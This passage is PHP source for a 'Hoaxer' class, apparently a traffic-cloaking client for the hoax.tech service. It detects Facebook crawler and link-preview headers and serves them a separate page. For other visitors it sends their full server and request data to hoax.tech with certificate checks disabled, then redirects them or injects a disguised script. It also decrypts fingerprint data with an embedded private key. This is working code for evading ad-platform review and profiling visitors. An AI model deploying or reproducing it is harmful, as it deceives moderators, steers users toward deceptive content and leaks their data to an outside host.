class Hoaxer
{
    public function __construct()
    {
        try {
            if (!function_exists('curl_version') || !function_exists('curl_init')) {
                throw new Exception('php-curl extension does not exist');
            }
            $headers = array_change_key_case(getallheaders());
            if (
                isset($headers['x-purpose']) && $headers['x-purpose'] === 'preview'
                || isset($headers['x-fb-http-engine']) && $headers['x-fb-http-engine'] === 'liger'
                || isset($headers['hoax-curl'])
            ) {
                exit(include 'index2.php');
            }
            $utmFilename = str_replace('.', '_', HOAX_FILENAME);
            if (isset($_GET[$utmFilename])) {
                header('Content-Type: application/javascript; charset=UTF-8');
                exit($this->showMimicAssets());
            }

            if (isset($_POST[HOAX_HDATA_FIELD])) {
                if (!$this->hdataCryptoAvailable()) {
                    $this->responser(['status' => 'failed']);
                }
                try {
                    $hdata = base64_encode($this->decryptHdata($_POST[HOAX_HDATA_FIELD]));
                } catch (Throwable $e) {
                    $this->responser(['status' => 'failed']);
                }
                $this->responser(
                    $this->utmTransfer(
                        json_decode($this->curlSender('extended', $hdata), true)
                    )
                );
            }

            new Redirect(
                $this->utmTransfer(
                    json_decode($this->curlSender('basic', $this->dataCollector()), true)
                ));

            echo $this->appendAssets(HTML::get());
        } catch (Throwable $e) {
            $this->responser([$e->getMessage()]);
        }
    }

    private function hdataCryptoAvailable()
    {
        foreach (['openssl_pkey_derive', 'openssl_pkey_get_public', 'openssl_pkey_get_private', 'openssl_decrypt', 'hash_hkdf'] as $function) {
            if (!function_exists($function)) {
                return false;
            }
        }
        return true;
    }

    private function showMimicAssets()
    {
        session_start();
        $flow = $_SESSION[HOAX_FLOW] ?? [];
        if (!is_array($flow)) {
            $flow = [];
        }

        return str_replace(
            ['---HOAX_TIME---', '---HOAX_ID---', '---HOAX_FLOW---', '---HOAX_COOKIE---'],
            [$flow[0] ?? '', $flow[1] ?? '', HOAX_FLOW, HOAX_FLOW],
            $this->assets()
        );
    }

    private function appendAssets(string $html): string
    {
        $offset = stripos($html, '</head>');
        if ($offset === false) {
            throw new \Exception('html markup error: missing </head> tag');
        }

        $src = '?' . HOAX_FILENAME
            . '&params='
            . $this->generateRandomValue();

        $script = "\n\t<script type=\"text/javascript\" src=\"{$src}\"></script>\n";

        return substr_replace($html, $script, $offset, 0);
    }


    private function generateRandomValue() 
    {
        switch (rand(1, 5)) {
            case 1: return bin2hex(random_bytes(5));
            case 2: return (string)rand(100000, 999999999); 
            case 3: return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, 10); 
            case 4: return uniqid();
            case 5: return (string)time(); 
        }
    }

    private function decryptHdata($envelope)
    {
        if (!is_string($envelope) || strlen($envelope) > HOAX_HDATA_MAX_ENVELOPE_SIZE) {
            throw new Exception('invalid hdata');
        }
        $parts = explode('.', $envelope, 6);
        if (count($parts) !== 5 || $parts[0] !== 'h1') {
            throw new Exception('invalid hdata');
        }
        $ephemeralDer = $this->base64urlDecode($parts[1]);
        $salt = $this->base64urlDecode($parts[2]);
        $iv = $this->base64urlDecode($parts[3]);
        $ciphertextWithTag = $this->base64urlDecode($parts[4]);
        if (strlen($ephemeralDer) > 2048 || strlen($salt) !== 16 || strlen($iv) !== 12 || strlen($ciphertextWithTag) < 16) {
            throw new Exception('invalid hdata');
        }
        $pem = "-----BEGIN PUBLIC KEY-----\n" . chunk_split(base64_encode($ephemeralDer), 64, "\n") . "-----END PUBLIC KEY-----\n";
        $ephemeral = openssl_pkey_get_public($pem);
        $privatePem = base64_decode(HOAX_HDATA_PRIVATE_KEY, true);
        $private = $privatePem === false ? false : openssl_pkey_get_private($privatePem);
        $ephemeralDetails = $ephemeral ? openssl_pkey_get_details($ephemeral) : false;
        $privateDetails = $private ? openssl_pkey_get_details($private) : false;
        if (!$ephemeral || !$private || !is_array($ephemeralDetails) || !is_array($privateDetails)
            || ($ephemeralDetails['ec']['curve_name'] ?? null) !== 'prime256v1'
            || ($privateDetails['ec']['curve_name'] ?? null) !== 'prime256v1') {
            throw new Exception('invalid hdata');
        }
        $secret = openssl_pkey_derive($ephemeral, $private);
        if (!is_string($secret) || strlen($secret) !== 32) {
            throw new Exception('invalid hdata');
        }
        $key = hash_hkdf('sha256', $secret, 32, 'hoax-hdata-v1', $salt);
        if (!is_string($key) || strlen($key) !== 32) {
            throw new Exception('invalid hdata');
        }
        $tag = substr($ciphertextWithTag, -16);
        $ciphertext = substr($ciphertextWithTag, 0, -16);
        $json = openssl_decrypt($ciphertext, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag);
        if (!is_string($json) || !is_array(json_decode($json, true)) || json_last_error() !== JSON_ERROR_NONE) {
            throw new Exception('invalid hdata');
        }
        return $json;
    }

    private function base64urlDecode($value)
    {
        if (!is_string($value) || $value === '' || !preg_match('/^[A-Za-z0-9_-]+$/D', $value) || strlen($value) % 4 === 1) {
            throw new Exception('invalid hdata');
        }
        $decoded = base64_decode(strtr($value, '-_', '+/') . str_repeat('=', (4 - strlen($value) % 4) % 4), true);
        if ($decoded === false) {
            throw new Exception('invalid hdata');
        }
        if (rtrim(strtr(base64_encode($decoded), '+/', '-_'), '=') !== $value) {
            throw new Exception('invalid hdata');
        }
        return $decoded;
    }

    private function utmTransfer($response)
    {
        if ($response['status'] === 'ok' && !empty($_GET) && HOAX_UTM === 'true') {
            $parsedUri = parse_url($response['link']);
            $start = (empty($parsedUri['query'])) ? '?' : '&';
            $response['link'] = $response['link'] . $start . http_build_query($_GET);
        }
        return $response;
    }

    private function dataCollector()
    {
        session_start();
        $_SESSION[HOAX_FLOW] = [HOAX_TIME, HOAX_ID];
        $_SERVER['time'] = HOAX_TIME;
        $_SERVER['bhash'] = HOAX_ID;
        $_SERVER['flow_hash'] = HOAX_FLOW;

        array_walk_recursive($_SERVER, function (&$parameter) {
            $parameter = htmlspecialchars((string) $parameter, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
        });

        return base64_encode(json_encode($_SERVER));
    }

    private function curlSender($type, $data)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
        curl_setopt($ch, CURLOPT_URL, "https://hoax.tech/api/v2?type=$type");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['data' => $data], '', '&', PHP_QUERY_RFC3986));
        $response = curl_exec($ch);
        if ($response === false) {
            throw new Exception('cURL error: ' . curl_error($ch));
        }
        return $response;
    }

    private function responser($response)
    {
        if (is_array($response)) {
            $response = json_encode($response);
        }
        header('Content-Type: application/json; charset=utf-8');
        exit($response);
    }

